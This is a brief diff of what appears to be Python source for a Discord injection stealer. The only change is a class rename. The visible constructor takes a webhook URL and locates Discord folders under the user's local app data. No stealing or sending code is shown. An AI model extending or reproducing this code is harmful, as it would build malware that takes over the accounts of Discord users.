@@ -6,7 +6,7 @@ import psutil
 import requests
 
 
-class injection:
+class Injection:
     def __init__(self, webhook: str) -> None:
         self.appdata = os.getenv('LOCALAPPDATA')
         self.discord_dirs = [
